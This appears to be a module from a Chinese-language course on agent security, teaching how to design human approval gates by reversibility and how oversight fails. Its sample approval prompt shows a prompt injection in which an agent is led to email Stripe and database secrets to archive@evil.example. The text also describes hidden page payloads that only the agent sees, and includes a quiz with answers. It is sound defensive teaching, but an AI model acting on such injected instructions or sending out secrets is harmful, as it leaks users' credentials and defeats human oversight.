import { h2, h3, p, ul, ol, steps, kv, callout, detail, table, code, figure, svg, box, arrow, svgText, sim, select, range, button, toggle, out, pill } from '../../../lib/components.mjs';

export const meta = { time: 14, attacks: '注意力是一种预算' };
export const scripts = ['/assets/js/sims/zh/a24.js'];

export const body = `
${p(`没人读的确认弹窗不是控制，它只是一笔延迟成本，外加一套合规说辞。这一章讲的是怎么让人工监督对得起
它造成的打断，而这件事说到底，基本上是一道算术题加一次坐标轴的选择。`)}

${h2('注意力是一种预算，而且会耗尽', 'fatigue')}

${sim({
  name: 'a24fatigue',
  title: '审批疲劳',
  badge: '交互实验',
  controls: [
    range('a24-n', '每天的审批弹窗数', 2, 200, 40, 1),
    range('a24-mal', '恶意的那一个出现在弹窗', 1, 200, 30, 1),
  ].join(''),
  body: out('a24-out'),
  note: `这条衰减曲线是示意而不是实测，但它的形状在安全可用性文献里早有定论：Akhawe 和 Felt 关于
    浏览器警告遵从度的实地数据，以及后续的 SSL 警告研究。机制不是懒惰，而是一个几乎总是可以安全
    忽略的弹窗，会把人训练成忽略它。`,
})}

${callout('boundary', '团队常常忽略的那个后果', `<p style="margin-bottom:0">审批闸门是一种<b>共享
资源</b>。你每加一个低价值的弹窗，花的都是和高价值弹窗同一笔预算，也就把后者削弱了一分。给一个可逆
动作加确认不是免费的谨慎，而是从一个账户里取钱，而你恰恰要在不可逆的事情发生时用到它。</p>`)}

${h2('按可逆性分级，不要按敏感度', 'reversibility')}

${p(`"敏感度"是多数系统采用的那条轴，而它给出的清单是错的。读一个密钥感觉很敏感，却完全可逆。发一封
邮件感觉很日常，却收不回来。可逆性才是那条能预测后悔的轴。`)}

${table(
  ['动作', '可逆性', '闸门', '影响范围'],
  [
    ['<code>read_file</code>', '免费', '只记日志', '一个文件'],
    ['<code>web_search</code>', '免费', '只记日志', '没有'],
    ['<code>write_file</code>', '有代价', '记日志 + 通知，可撤销', '一个文件，可从快照恢复'],
    ['<code>git_commit</code>', '有代价', '记日志 + 通知，可撤销', '可以 revert'],
    ['<code>git push --force</code>', '<b>不可逆</b>', '<b>阻塞式确认</b>', '分支历史'],
    ['<code>send_email</code>', '<b>不可逆</b>', '<b>阻塞式确认</b>', '无界；你没法把邮件收回来'],
    ['<code>delete_repo</code>', '<b>不可逆</b>', '<b>阻塞式确认</b>', '一切'],
    ['<code>payment</code>', '<b>不可逆</b>', '<b>阻塞式确认</b>', '钱'],
    ['<code>post_publicly</code>', '<b>不可逆</b>', '<b>阻塞式确认</b>', '声誉'],
  ]
)}

${h2('弹窗必须说清什么', 'prompt-design')}

${p(`多数系统展示的是这样一个弹窗：`)}

${code(`The agent wants to use the tool \`send_email\`. Allow?   [Allow] [Deny]`,
  { lang: 'txt', tag: 'vuln', file: '不可读', tagText: '有漏洞' })}

${p(`而下面这个，是会被真正读进去的：`)}

${code(`Send an email                                          IRREVERSIBLE

  to        archive@evil.example      ← not in your contacts, new domain
  subject   fwd
  body      STRIPE_KEY=sk_live_51H8xQ2
            DB_PASSWORD=hunter2

  Why the agent wants this
    An instruction found in the page you asked it to summarise
    (https://caching.example/guide) asked it to email this file.
    That instruction did not come from you.

  [ Send ]   [ Don't send ]   [ Don't send, and stop the task ]`,
  { lang: 'txt', tag: 'safe', file: '可读', tagText: '已加固' })}

${p(`差别不在于礼貌。具体变了四件事：`)}

${ul([
  `<b>要离开的数据</b>，而不是工具名。用户没法评估 <code>send_email</code>，但完全能评估"你的
   Stripe 密钥马上就要出去了"。`,
  `<b>收件人</b>，以及它为什么不寻常。异常上下文能把一个判断变成一个容易做的判断。`,
  `<b>指令的溯源。</b>如果你建过 <a href="/zh/chapters/a21/">A21</a>，这一项白送，而且它是屏幕上
   最能左右决定的那个事实。`,
  `<b>第三个选项。</b>光有"拒绝"，被劫持的智能体还在跑，还能接着试下一件事。"停止任务"才是用户
   在觉得不对劲时真正想要的那个动作。`,
])}

${h2('给打断编预算', 'budget')}

${steps([
  ['给每个任务定一个预算',
   `比如三个弹窗。如果一个任务会超出这个预算，那是关于这个任务的信号，而不是抬高预算的理由。`],
  ['只把预算花在不可逆的动作上',
   `其余的记日志，或者通知一声并留一条撤销路径。`],
  ['超预算时：把任务收窄',
   `把它拆成几个阶段，在阶段之间审批，而不是在每个阶段内部审批。`],
  ['超预算时：预先授权一个作用域',
   `"你可以给我通讯录里的任何人发邮件"能把五十个弹窗变成一个，而这恰恰就是
    <a href="/zh/chapters/a22/">A22</a> 里那份削权后的授权。`],
  ['超预算时：把动作变成可逆的',
   `<b>这一行是大家会跳过的。</b>用草稿代替发送。写之前先做快照。用暂存的提交代替 push。把一个不可
    逆的动作变成可逆的，就彻底不需要那个弹窗了，这严格优于把弹窗做得更好看。`],
])}

${h2('为什么监督本身就是一个威胁面', 'oversight-surface')}

${p(`SEI 的分类法把监督失效列为六个攻击面之一，理由是糟糕的监督比没有监督更糟，因为它制造信心。
三种模式：`)}

${kv([
  ['人工确认失效', `就是上面说的审批疲劳。审查者在场、有权限，实际上却等于不在。`],
  ['可解释性失效', `智能体给出的动作理由，不是真正的理由。于是审查它的推理什么也验证不了，而且验证得
    很有说服力。这正是上面那个好弹窗展示<em>溯源</em>（一个关于数据从哪里来的事实），而不是展示模型
    自述动机的原因。`],
  ['监控失效', `覆盖有缺口、发生漂移、轨迹没被解析、告警发给了没有人。这部分在
    <a href="/zh/chapters/a26/">A26</a> 里讲。`],
])}

${p(`另外回想 <a href="/zh/chapters/a08/">A08</a>：对计算机操作型智能体来说，人工审查可能在构造上
就是无效的。操作员和智能体感知的是不同的产物，所以对屏幕再仔细的审查，也说明不了智能体到底读到了
什么。`)}

${h2('你现在应该能做到', 'checkpoint')}

${ul([
  `解释为什么给一个可逆动作加确认，反而让你的系统更不安全。`,
  `按可逆性给一个智能体的工具清单分级，并推导出每一项该配什么闸门。`,
  `写一个包含那四样东西、让人真能做出判断的审批弹窗。`,
  `说出三种把打断压回预算之内的办法，以及哪一种最好。`,
])}
`;

export const quiz = [
  {
    q: `给一个可逆动作加确认弹窗，为什么反而让整个系统更不安全？`,
    options: [
      `它增加延迟，会促使用户干脆关掉确认。`,
      `审批注意力是一笔共享且会耗尽的预算，所以每一个低价值弹窗都花的是和高价值弹窗同一个账户里的钱，把后者削弱了。`,
      `可逆动作没法可靠地被确认。`,
      `并不会；确认越多总是越安全。`,
    ],
    answer: 1,
    explain: `这些弹窗不是彼此独立的。一个被四十次安全的"点掉"训练出安全预期的审查者，会把这份预期
      带到第四十一次，而那一次才是要紧的。所以纪律是从可逆动作上<em>拿掉</em>弹窗，而不是到处加
      弹窗，也所以"我们什么都要确认"是一种症状而不是一个控制。`,
  },
  {
    q: `为什么按可逆性给动作分级，而不是按敏感度？`,
    options: [
      `可逆性更容易度量。`,
      `敏感度给出的清单是错的：读一个密钥感觉很敏感，却是可逆的；发一封邮件感觉很日常，却收不回来。`,
      `敏感度太主观。`,
      `监管机构要求按可逆性分级。`,
    ],
    answer: 1,
    explain: `这两条轴恰恰在最要紧的那些情况下不一致。可逆性预测后悔。它回答的是一个确认弹窗之所以
      存在要问的那个问题："如果这一步错了，我们还能补救吗？"读一个密钥被出站策略围住，事后还能审计；
      而一封发错了收件人的邮件，从按下发送的那一刻起就是永久的，不管那个工具看上去多么平常。`,
  },
  {
    q: `一个好的审批弹窗里，哪一项元素最直接地得益于你已经建好了信息流控制？`,
    options: [
      `展示收件人地址。`,
      `展示指令的溯源（它来自一个抓回来的页面，而不是来自用户）。`,
      `提供第三个"停止任务"的选项。`,
      `把动作标注为不可逆。`,
    ],
    answer: 1,
    explain: `A21 的标签恰好记录了每个值从哪里来、每次调用由什么引起，这才让弹窗能说出"这条指令是在
      你要求它做摘要的那个页面里找到的"。没有溯源追踪，你只能报告模型自述的动机，而 A24 里那个
      可解释性失效模式说的正是：这份自述可能不是真正的理由。收件人和可逆性标签来自你的工具元数据；
      第三个选项是一个 UI 选择。`,
  },
  {
    q: `一个好的审批弹窗为什么要提供"不要发送，并且停止任务"这第三个选项？`,
    options: [
      `为了满足无障碍规范。`,
      `因为光有"拒绝"，被劫持的智能体还在跑，还能自由地去试下一件事，而人在觉得不对劲时真正想要的是停下来。`,
      `为了减少弹窗数量。`,
      `因为不带解释的拒绝会让模型困惑。`,
    ],
    answer: 1,
    explain: `一次拒绝只是单步否决，而在这个弹窗真正要紧的情形里，对面那个智能体正被别人控制着。它
      只会换个花样再试一次，再花掉审查者一份注意力。提供终止选项，才对得上用户真正的意图——"这里有
      问题"——并且把一个可疑弹窗转化成一次被叫停的运行和一起可调查的事件。`,
  },
  {
    q: `某个任务会需要十二个审批弹窗。哪种应对最好？`,
    options: [
      `把预算抬到十二；这个任务确实需要这么多。`,
      `把它们打包成一个合并弹窗。`,
      `把这些动作变成可逆的：用草稿代替发送，写之前先做快照，于是大部分弹窗都没必要了。`,
      `抽样决定确认哪些动作，减到三个。`,
    ],
    answer: 2,
    explain: `改变动作的可逆性是把这个判断的需求消掉，而不是换个包装。一份由人事后成批审阅的草稿，
      或者一次前面加了快照的写入，把不可逆动作变成了有代价但可修复的动作，于是它直接从阻塞那一层
      掉了出去。打包会藏起让每个判断得以成立的细节；抽样意味着要紧的那一个多半没被确认；抬高预算
      就是回到疲劳的老路。`,
  },
  {
    q: `对一个计算机操作型智能体来说，"有人在盯着屏幕"为什么是一个特别弱的控制？`,
    options: [
      `人看不了那么快。`,
      `操作员和智能体感知的是不同的产物：藏在 <code>aria-label</code>、alt 文本或屏幕外节点里的载荷，智能体读得到，屏幕上却看不见。`,
      `屏幕太小，显示不下完整上下文。`,
      `计算机操作型智能体的行为太难预测。`,
    ],
    answer: 1,
    explain: `这就是 A08 的感知鸿沟，它让视觉监督在构造上就是无效的，而不只是很难做。操作员对一份
      并不包含攻击的渲染结果做了真实而仔细的审查，然后如实报告说这个页面看起来没问题。任何假定人和
      智能体看到的是同一个东西的监督设计，都必须换成一种把智能体实际读到的内容摆给操作员看的设计。`,
  },
];

export const refs = [
  { authors: 'Devdatta Akhawe, Adrienne Porter Felt', title: 'Alice in Warningland: A Large-Scale Field Study of Browser Security Warning Effectiveness',
    venue: 'USENIX Security, 2013',
    url: 'https://www.usenix.org/conference/usenixsecurity13/technical-sessions/presentation/akhawe' },
  { authors: 'Adrienne Porter Felt, Alex Ainslie, Robert W. Reeder, Sunny Consolvo, Somas Thyagaraja, Alan Bettes, Helen Harris, Jeff Grimes',
    title: 'Improving SSL Warnings: Comprehension and Adherence', venue: 'ACM CHI, 2015',
    url: 'https://research.google/pubs/pub43265/' },
  { authors: 'Zana Buçinca, Maja Barbara Malaya, Krzysztof Z. Gajos',
    title: 'To Trust or to Think: Cognitive Forcing Functions Can Reduce Overreliance on AI in AI-assisted Decision-making',
    venue: 'ACM CSCW, 2021', url: 'https://arxiv.org/abs/2102.09692' },
  { authors: 'Alan Chan, Carson Ezell, Max Kaufmann, Kevin Wei, Lewis Hammond, Herbie Bradley, Emma Bluemke, Nitarshan Rajkumar, David Krueger, Noam Kolt, Lennart Heim, Markus Anderljung',
    title: 'Visibility into AI Agents', venue: 'ACM FAccT, 2024', url: 'https://arxiv.org/abs/2401.13138' },
  { authors: 'Shreya Rajpal and the Guardrails AI contributors', title: 'Guardrails AI',
    venue: 'guardrailsai.com', url: 'https://www.guardrailsai.com/' },
  { authors: 'Shishir G. Patil, Tianjun Zhang, Vivian Fang, Noppapon C., Roy Huang, Aaron Hao, Martin Casado, Joseph E. Gonzalez, Raluca Ada Popa, Ion Stoica',
    title: 'GoEX: Perspectives and Designs Towards a Runtime for Autonomous LLM Applications',
    venue: 'arXiv, 2024', url: 'https://arxiv.org/abs/2404.06921',
    note: '面向智能体动作的撤销与损害围堵原语' },
  { authors: 'Keltin Grimes, Julie Lawler, Robert C. Garrett, Emil Mathew, Marco Christiani, Sara Kingsley, Zhiwei Steven Wu, Nathan VanHoudnos',
    title: 'SoK: Bridging Research and Practice in LLM Agent Security',
    venue: 'CMU Software Engineering Institute, 2025', url: 'https://doi.org/10.1184/R1/30610928',
    note: '把监督失效当作一个威胁面；有 16 处来源推荐人工确认，其中 14 处来自工业界' },
];
